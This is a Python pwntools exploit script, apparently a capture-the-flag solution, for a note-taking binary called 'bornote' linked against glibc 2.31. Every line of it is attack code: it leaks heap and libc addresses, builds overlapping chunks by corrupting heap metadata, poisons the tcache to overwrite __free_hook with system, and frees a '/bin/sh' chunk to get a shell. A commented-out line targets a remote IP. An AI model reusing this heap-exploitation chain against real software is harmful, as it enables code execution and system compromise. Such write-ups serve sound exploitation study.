#coding: utf-8
from pwn import *
# from LibcSearcher import LibcSearcher
#context.log_level = 'debug'

binary = './bornote'
elf = ELF(binary)
libc = ELF("./libc-2.31.so")
p = process(binary)
#p = connect("121.36.250.162",49153)

def add(size):
    p.recvuntil(b'cmd: ')
    p.sendline(b'1')
    p.recvuntil(b"Size: ")
    p.sendline(str(size))

def show(num):
    p.recvuntil(b'cmd: ')
    p.sendline(b'4')
    p.recvuntil(b'Index: ')
    p.sendline(str(num))


def edit(num,text=''):
    p.recvuntil(b'cmd: ')
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(num))
    p.recvuntil(b"Note: ")
    p.sendline(text)

def free(num):
    p.recvuntil(b'cmd: ')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(num))


p.recvuntil(b'username')
p.sendline(b'aaa')
for i in range(10):
    add(0xf8)
for i in range(5):
    free(i)
add(0xf8)
show(0)
p.recvuntil('Note: ')
heap_addr = u64(p.recv(6).ljust(8, b'\x00')) + 0x200
gdb.attach(p)
lg("heap",heap_addr)
free(0)
free(8)
free(9)
free(5)#7
free(6)#8
free(7)#9
for i in range(10):
    add(0xf8)
for i in range(7):
    free(i)
show(8)
p.recvuntil('Note: ')
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x1EBBE0
lg("libc_base",libc_base)
free_hook = libc_base+libc.sym["__free_hook"]
sys_addr = libc.sym["system"]+libc_base
payload = p64(0)+p64(0x1f1)
edit(7, payload + p64(heap_addr)+p64(heap_addr))
show(7)
edit(8,b"a"*0xf0+p64(0x1f0) + b'\x00')
free(9)
for i in range(7):
    add(0xf8)
add(0xf8-0x10)  #9
free(9)
add(0xf8)   #10
free(6)
free(5)
free(9)
edit(8,p64(free_hook))
add(0xf8)   #5
add(0xf8)   #6
edit(6, p64(sys_addr))
edit(2, '/bin/sh\x00')
free(2)

p.interactive()